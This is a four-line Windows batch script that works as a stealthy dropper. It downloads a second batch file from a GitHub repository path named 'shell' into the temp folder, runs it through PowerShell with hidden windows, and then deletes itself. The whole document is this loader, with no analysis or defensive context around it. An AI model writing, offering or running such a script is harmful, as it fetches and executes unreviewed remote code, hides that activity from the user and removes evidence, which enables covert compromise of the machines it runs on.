@echo off
curl https://raw.githubusercontent.com/0x2034/shell/main/sec1.bat -o %temp%\sec1.bat
powershell.exe -WindowStyle Hidden -Command "Start-Process '%temp%\sec1.bat' -WindowStyle Hidden"
del "%~f0"
